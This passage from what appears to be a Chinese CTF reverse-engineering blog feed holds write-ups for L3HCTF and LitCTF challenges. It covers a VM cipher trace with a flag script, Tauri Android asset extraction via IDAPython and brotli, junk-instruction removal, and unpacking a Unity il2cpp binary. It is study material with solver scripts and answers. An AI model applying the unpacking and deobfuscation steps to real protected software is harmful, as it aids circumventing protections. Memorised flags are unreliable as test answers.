class="hljs-comment">[IP=72]</span>stack_data<span class="hljs-comment">[16]</span> = co_consts<span class="hljs-comment">[14]</span> = 0x87<br><span class="hljs-comment">[IP=73]</span>stack_data<span class="hljs-comment">[15]</span> = a ^ b = stack_data<span class="hljs-comment">[15]</span> ^ stack_data<span class="hljs-comment">[16]</span> = 0x87<br><span class="hljs-comment">[IP=74]</span>stack_data<span class="hljs-comment">[16]</span> = co_consts<span class="hljs-comment">[30]</span> = 0x0<br><span class="hljs-comment">[IP=75]</span>stack_data<span class="hljs-comment">[15]</span> = a - b = stack_data<span class="hljs-comment">[15]</span> - stack_data<span class="hljs-comment">[16]</span> = 0x87<br><span class="hljs-comment">[IP=76]</span>=== VERIFY cipher check ===<br>    stack<span class="hljs-comment">[ 0]</span>=0xB0 vs cipher<span class="hljs-comment">[ 0]</span>-20=0xDF<br>    stack<span class="hljs-comment">[ 1]</span>=0x78 vs cipher<span class="hljs-comment">[ 1]</span>-20=0x6E<br>    stack<span class="hljs-comment">[ 2]</span>=0x32 vs cipher<span class="hljs-comment">[ 2]</span>-20=0x-E<br>    stack<span class="hljs-comment">[ 3]</span>=0x7C vs cipher<span class="hljs-comment">[ 3]</span>-20=0x1E9<br>    stack<span class="hljs-comment">[ 4]</span>=0xE8 vs cipher<span class="hljs-comment">[ 4]</span>-20=0x13C<br>    stack<span class="hljs-comment">[ 5]</span>=0xE1 vs cipher<span class="hljs-comment">[ 5]</span>-20=0x24<br>    stack<span class="hljs-comment">[ 6]</span>=0x20 vs cipher<span class="hljs-comment">[ 6]</span>-20=0x9E<br>    stack<span class="hljs-comment">[ 7]</span>=0x10 vs cipher<span class="hljs-comment">[ 7]</span>-20=0xCA<br>    stack<span class="hljs-comment">[ 8]</span>=0x76 vs cipher<span class="hljs-comment">[ 8]</span>-20=0x146<br>    stack<span class="hljs-comment">[ 9]</span>=0xAD vs cipher<span class="hljs-comment">[ 9]</span>-20=0x183<br>    stack<span class="hljs-comment">[10]</span>=0xB3 vs cipher<span class="hljs-comment">[10]</span>-20=0x88<br>    stack<span class="hljs-comment">[11]</span>=0x14 vs cipher<span class="hljs-comment">[11]</span>-20=0x1C3<br>    stack<span class="hljs-comment">[12]</span>=0x20 vs cipher<span class="hljs-comment">[12]</span>-20=0x5A<br>    stack<span class="hljs-comment">[13]</span>=0xC vs cipher<span class="hljs-comment">[13]</span>-20=0x14<br>    stack<span class="hljs-comment">[14]</span>=0x68 vs cipher<span class="hljs-comment">[14]</span>-20=0x132<br>    stack<span class="hljs-comment">[15]</span>=0x87 vs cipher<span class="hljs-comment">[15]</span>-20=0x83<br><br></code></pre></td></tr></table></figure><p>最终解密代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher = [<span class="hljs-number">0xF3</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x97</span>]<br>target = [c - <span class="hljs-number">20</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher]<br>co_consts_fixed = [<span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x87</span>]<br><br>x = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br><br>x[<span class="hljs-number">0</span>] = target[<span class="hljs-number">0</span>]<br><br>x1_xor_x0 = target[<span class="hljs-number">1</span>] + co_consts_fixed[<span class="hljs-number">0</span>]<br>x[<span class="hljs-number">1</span>] = x1_xor_x0 ^ x[<span class="hljs-number">0</span>]<br>x1_xor_x0 = co_consts_fixed[<span class="hljs-number">0</span>] - target[<span class="hljs-number">1</span>]<br>x[<span class="hljs-number">1</span>] = x1_xor_x0 ^ x[<span class="hljs-number">0</span>]<br><br>x = [<br>    <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x4C</span>,<br>    <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x58</span><br>]<br><br><span class="hljs-comment"># 转换为32位十六进制（每个x[i]→2位，补0）</span><br>hex_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;num:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> x)<br><br><span class="hljs-comment"># 最终密码</span><br>password = <span class="hljs-string">f&quot;L3HCTF&#123;&#123;<span class="hljs-subst">&#123;hex_str&#125;</span>&#125;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确解密密码：&quot;</span>)<br><span class="hljs-built_in">print</span>(password)<br></code></pre></td></tr></table></figure><h1 id="ez-android"><a href="#ez-android" class="headerlink" title="ez_android"></a>ez_android</h1><p>这题也是花了一天多的时间才解决QAQ，真是不容易啊，还是得好好理解，多动动脑筋嘞~</p><p>直接在com目录下找到mainactivity，发现TauriActivity，不太清楚Tauri 框架是啥</p><p>在swdd的指导下先学习一下理论知识</p><hr><h2 id="TauriActivity"><a href="#TauriActivity" class="headerlink" title="TauriActivity"></a>TauriActivity</h2><p><code>TauriActivity</code> 是 Tauri 框架为 Android 平台提供的桥接 Activity 类，Tauri 是一个跨平台应用开发框架（主要用 Rust 编写），允许使用 Web 技术（HTML&#x2F;JS&#x2F;CSS） 构建前端，同时通过 Rust 后端实现逻辑。</p><p><code>TauriActivity</code> 的主要功能：</p><ol><li>提供一个 WebView 容器，加载应用前端（HTML&#x2F;JS）。</li><li>通过 JNI 调用 Rust 编译的共享库（<code>libtauri.so</code>）。</li><li>提供文件选择、权限处理、JS ↔ Rust 通信接口。</li></ol><hr><h4 id="Tauri-框架的静态资源提取方法"><a href="#Tauri-框架的静态资源提取方法" class="headerlink" title="Tauri 框架的静态资源提取方法:"></a><strong>Tauri 框架的静态资源提取方法:</strong></h4><p>先直接搜索关键词：index.html，交叉引用发现这里的包含文件名和文件位置的表</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507181759290.png" alt="image-20250718175941196"></p><p>以下代码把文件内容dump出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ida_python">import ida_bytes<br><br>addr = 0x00000000000C9498  <br>size = 0xEB                <br><br>dump = ida_bytes.get_bytes(addr, size)<br><br>file_path = r&quot;C:\Users\38489\Desktop\index_html.br&quot;<br>with open(file_path, &quot;wb&quot;) as f:<br>    f.write(dump)<br><br>print(f&quot;[+] 提取完成，文件已保存到: &#123;file_path&#125; (大小 &#123;len(dump)&#125; bytes)&quot;)<br></code></pre></td></tr></table></figure><p>由于我的idapython一直没法安装成功brotli，就先dump出来文件之后在本地解压缩</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> brotli<br><br>compressed_file_path = <span class="hljs-string">r&quot;C:\Users\38489\Desktop\index_html.br&quot;</span><br>output_file_path = <span class="hljs-string">r&quot;C:\Users\38489\Desktop\dumpp&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(compressed_file_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Compressed file size: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(content)&#125;</span> bytes&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_decompress</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> brotli.decompress(data)<br>    <span class="hljs-keyword">except</span> brotli.error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>decompressed = <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(content), <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>    decompressed = try_decompress(content[:i])<br>    <span class="hljs-keyword">if</span> decompressed <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> decompressed <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file_path, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decompressed)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decompressed content written to <span class="hljs-subst">&#123;output_file_path&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to decompress the content.&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>然后就可以读取html文件内容啦</p><hr><h4 id="这题的解题wp："><a href="#这题的解题wp：" class="headerlink" title="这题的解题wp："></a>这题的解题wp：</h4><p>解包apk文件之后看看有啥内容</p><p>打开assets想要找到.js文件或者.html文件，但是只有prof文件，说明前端资源被打包或者压缩了，结合tauri框架，前端文件可能被打包进rust后端可执行文件里了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020931046.png" alt="image-20250717161547585"></p><p>ida反编译so文件</p><p>依照上面写的静态资源提取方法，解压缩index.html内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020931624.png" alt="image-20250718173951503"></p><p>index内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507181825791.png" alt="image-20250718182510695"></p><p>加载核心 JS，<code>index-BsFf5qny.js</code> 是打包后的 <strong>入口 JS</strong> 文件。负责启动 Vue 应用、挂载到 <code>#app</code>，以及通过 Tauri 的 API 调用 Rust 后端。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;module&quot;</span> crossorigin src=<span class="hljs-string">&quot;/assets/index-BsFf5qny.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>和上述过程一样，继续搜索关键词，找到这个js文件，dump出来后解压</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507181742060.png" alt="image-20250718174211972"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs idapython">import ida_bytes<br>import idc<br>import os<br><br>OUT_DIR = r&quot;C:\Users\38489\Desktop&quot;<br>RES_NAME = &quot;index-BsFf5qny.js.br&quot;  <br><br>data_ea = idc.get_name_ea_simple(&quot;unk_C356F&quot;)<br>if data_ea == idc.BADADDR:<br>    raise RuntimeError(&quot;找不到符号 unk_C356F，请确认名字一致。&quot;)<br><br>comp_size = 0x5D50<br><br>print(f&quot;[+] Dumping resource from 0x&#123;data_ea:X&#125;, size 0x&#123;comp_size:X&#125; (&#123;comp_size&#125; bytes)&quot;)<br><br>blob = ida_bytes.get_bytes(data_ea, comp_size)<br>if blob is None:<br>    raise RuntimeError(&quot;读取资源失败（可能地址或长度不对）。&quot;)<br><br>os.makedirs(OUT_DIR, exist_ok=True)<br>out_path = os.path.join(OUT_DIR, RES_NAME)<br>with open(out_path, &quot;wb&quot;) as f:<br>    f.write(blob)<br><br>print(f&quot;[+] 写出压缩文件: &#123;out_path&#125; (size=&#123;len(blob)&#125; bytes)&quot;)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> brotli<br><br>in_path = <span class="hljs-string">r&quot;C:\Users\38489\Desktop\index-BsFf5qny.js.br&quot;</span><br>out_path = <span class="hljs-string">r&quot;C:\Users\38489\Desktop\index-BsFf5qny.js&quot;</span><br><br>data = <span class="hljs-built_in">open</span>(in_path, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-keyword">try</span>:<br>    dec = brotli.decompress(data)<br>    <span class="hljs-built_in">open</span>(out_path, <span class="hljs-string">&quot;wb&quot;</span>).write(dec)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 成功解压 -&gt;&quot;</span>, out_path, <span class="hljs-string">&quot;长度&quot;</span>, <span class="hljs-built_in">len</span>(dec))<br><span class="hljs-keyword">except</span> brotli.error <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] 解压失败:&quot;</span>, e)<br><br></code></pre></td></tr></table></figure><p>解压出来之后，找到关键点：js与后端rust交互，后端接口是greet，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020931028.png" alt="image-20250718183114865"></p><p>直接在ida里搜索greet，找到函数，就是主加密函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020931733.png"></p><p>脚本</p><p>写脚本的时候还是要注意一下密文的提取，最后是v8的第19位与v19的第三位数据往后的八字节内容，当时脚本在密文这没好好分析，结果一直没出来，还是得注意一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>TABLE = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x64</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x6C</span>,<span class="hljs-number">0x7A</span>,<br>    <span class="hljs-number">0x59</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x6C</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x51</span>,<br>    <span class="hljs-number">0x57</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x72</span><br>])<br><br>target_values = [<br>    <span class="hljs-number">0x0A409663A025150C</span>,<br>    <span class="hljs-number">0x1FE106294065165C</span>,<br>    <span class="hljs-number">0xFC020A4C0E2C7290</span>,<br>    <span class="hljs-number">0x2A324F</span><br>]<br><br>full_data = <span class="hljs-string">b&#x27;&#x27;</span>.join(struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, v) <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> target_values)<br>TARGET = full_data[:<span class="hljs-number">27</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol8</span>(<span class="hljs-params">x, n</span>): <span class="hljs-keyword">return</span> ((x &lt;&lt; (n&amp;<span class="hljs-number">7</span>)) | (x &gt;&gt; (<span class="hljs-number">8</span>-(n&amp;<span class="hljs-number">7</span>)))) &amp; <span class="hljs-number">0xFF</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror8</span>(<span class="hljs-params">x, n</span>): <span class="hljs-keyword">return</span> ((x &gt;&gt; (n&amp;<span class="hljs-number">7</span>)) | (x &lt;&lt; (<span class="hljs-number">8</span>-(n&amp;<span class="hljs-number">7</span>)))) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward_byte</span>(<span class="hljs-params">i, b_in</span>):<br>    idx_mix = i <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">14</span> <span class="hljs-keyword">else</span> i - <span class="hljs-number">14</span><br>    tblA = TABLE[idx_mix]<br>    idx_dyn = (((<span class="hljs-number">2</span>*i) | <span class="hljs-number">1</span>) - <span class="hljs-number">14</span> * ((<span class="hljs-number">147</span> * ((<span class="hljs-number">2</span>*i) | <span class="hljs-number">1</span>)) &gt;&gt; <span class="hljs-number">11</span>)) &amp; <span class="hljs-number">0xFF</span><br>    tblB = TABLE[idx_dyn % <span class="hljs-built_in">len</span>(TABLE)]<br>    rot_src = TABLE[(i + <span class="hljs-number">3</span>) % <span class="hljs-number">14</span>]<br>    xsrc    = TABLE[(i + <span class="hljs-number">4</span>) % <span class="hljs-number">14</span>]<br>    rot     = rot_src &amp; <span class="hljs-number">7</span><br>    v11 = (tblB + (b_in ^ tblA)) &amp; <span class="hljs-number">0xFF</span><br>    <span class="hljs-keyword">return</span> xsrc ^ rol8(v11, rot)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_byte</span>(<span class="hljs-params">i, b_out</span>):<br>    idx_mix = i <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">14</span> <span class="hljs-keyword">else</span> i - <span class="hljs-number">14</span><br>    tblA = TABLE[idx_mix]<br>    idx_dyn = (((<span class="hljs-number">2</span>*i) | <span class="hljs-number">1</span>) - <span class="hljs-number">14</span> * ((<span class="hljs-number">147</span> * ((<span class="hljs-number">2</span>*i) | <span class="hljs-number">1</span>)) &gt;&gt; <span class="hljs-number">11</span>)) &amp; <span class="hljs-number">0xFF</span><br>    tblB = TABLE[idx_dyn % <span class="hljs-built_in">len</span>(TABLE)]<br>    rot_src = TABLE[(i + <span class="hljs-number">3</span>) % <span class="hljs-number">14</span>]<br>    xsrc    = TABLE[(i + <span class="hljs-number">4</span>) % <span class="hljs-number">14</span>]<br>    rot     = rot_src &amp; <span class="hljs-number">7</span><br>    r   = b_out ^ xsrc<br>    v11 = ror8(r, rot)<br>    tmp = (v11 - tblB) &amp; <span class="hljs-number">0xFF</span><br>    <span class="hljs-keyword">return</span> tmp ^ tblA<br><br>recovered = <span class="hljs-built_in">bytes</span>(reverse_byte(i, TARGET[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(TARGET)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Recovered 27-byte input:&quot;</span>, recovered)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hex:&quot;</span>, recovered.<span class="hljs-built_in">hex</span>())<br><br>recheck = <span class="hljs-built_in">bytes</span>(forward_byte(i, recovered[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(TARGET)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Forward recompute matches TARGET?:&quot;</span>, recheck == TARGET)<br><br></code></pre></td></tr></table></figure><p>完结撒花~</p><p>另附，学习这位师傅的tauri框架静态资源提取的方法<a href="https://blog.yllhwa.com/2023/05/09/Tauri%20%E6%A1%86%E6%9E%B6%E7%9A%84%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">https://blog.yllhwa.com/2023/05/09/Tauri%20%E6%A1%86%E6%9E%B6%E7%9A%84%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/</a></p>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花指令-近跳转和call0h型</title>
    <link href="/2025/06/02/%E8%8A%B1%E6%8C%87%E4%BB%A4-%E8%BF%91%E8%B7%B3%E8%BD%AC%E5%92%8Ccall0h%E5%9E%8B/"/>
    <url>/2025/06/02/%E8%8A%B1%E6%8C%87%E4%BB%A4-%E8%BF%91%E8%B7%B3%E8%BD%AC%E5%92%8Ccall0h%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>根据<a href="https://xz.aliyun.com/news/14062">https://xz.aliyun.com/news/14062</a> 这位师傅的文章学习来的</p><p>这两道题目的花指令都是近跳转和call 0h型</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022341874.png" alt="image-20250602234135782"></p><h3 id="1、LitCTF-2025-easy-tea"><a href="#1、LitCTF-2025-easy-tea" class="headerlink" title="1、LitCTF 2025 | easy_tea"></a>1、LitCTF 2025 | easy_tea</h3><p>直接shift+f2找到主要的加密位置，然后看到花，把这个近跳转nop，然后下面的函数按d转为机器码，有好几处花，都直接nop掉</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337395.png" alt="img"></p><p>然后一整个部分再按p识别成函数，然后f5，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337449.png" alt="img"></p><p>这里主tea加密部分仍然看不到，进去之后看到这一部分还是花，nop掉之后，把下面的部分按d，最后直接按p和f5反汇编和上面的操作一样</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337445.png" alt="img"></p><p>就是这个</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337401.png" alt="img"></p><h3 id="2、camellia-练习"><a href="#2、camellia-练习" class="headerlink" title="2、camellia-练习"></a>2、camellia-练习</h3><p>这个题也一样，把近跳转nop掉之后，再把下面的那段按d看机器码更方便</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337040.png" alt="img"></p><p>这里就是要nop掉的，call 0h类型</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337415.png" alt="img"></p><p>如果看不出来也可以把这一小段按c强制编译看汇编，这里就是花指令，nop掉</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022336973.png" alt="img"></p><p>然后再把剩下的那一段按c强制编译，没啥问题，已经除掉花了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022336957.png" alt="img"></p><p>然后f5看伪代码，发现这里的加密函数位置还有无法编译的花指令</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337991.png" alt="img"></p><p>进入那个函数，还是一样的思路，nop掉之后反编译就能看到代码了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022358942.png" alt="img"></p><p>这就是主要的tea加密算法，解密就行</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022336945.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>reverse-探索的过程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>花指令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unity逆向il2cpp打包</title>
    <link href="/2025/05/29/unity%E9%80%86%E5%90%91il2cpp%E6%89%93%E5%8C%85/"/>
    <url>/2025/05/29/unity%E9%80%86%E5%90%91il2cpp%E6%89%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="unity逆向-il2cpp"><a href="#unity逆向-il2cpp" class="headerlink" title="unity逆向-il2cpp"></a>unity逆向-il2cpp</h1><h3 id="LitCTF-2025-Robbie-Wanna-Revenge"><a href="#LitCTF-2025-Robbie-Wanna-Revenge" class="headerlink" title="LitCTF 2025-Robbie Wanna Revenge"></a>LitCTF 2025-Robbie Wanna Revenge</h3><p>il2cpp打包的unity游戏题，在网上搜了文章，</p><p>根据晓梦的文章<a href="https://xz.aliyun.com/news/15811">https://xz.aliyun.com/news/15811</a></p><p>和swdd的文章<a href="https://blog.csdn.net/qq_24481913/article/details/148234091?sharetype=blogdetail&sharerId=148234091&sharerefer=PC&sharesource=qq_24481913&spm=1011.2480.3001.8118">https://blog.csdn.net/qq_24481913/article/details/148234091?sharetype=blogdetail&amp;sharerId=148234091&amp;sharerefer=PC&amp;sharesource=qq_24481913&amp;spm=1011.2480.3001.8118</a></p><p>利用ilcppdumper提取il2cpp等文件，这是il2cppdumper下载的网址<a href="https://github.com/Perfare/Il2CppDumper/">https://github.com/Perfare/Il2CppDumper/</a></p><p>在终端输入命令 <code>.\Il2CppDumper.exe 文件名.dll 文件名.dat output</code>，dll文件就是GameAssembly.dll</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291128040.png" alt="image-20250528233715951"></p><p>直接运行命令发现报错，识别不到，再看dll文件，加了壳</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291144110.png" alt="image-20250528213639891"></p><p>还修改了特征码，用010改回来之后再脱壳</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291147990.png" alt="image-20250528223136275"></p><p>脱壳之后再运行命令。就成功dump了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291147004.png" alt="image-20250528223115942"></p><p>这就是dump出来的文件</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291522063.png" 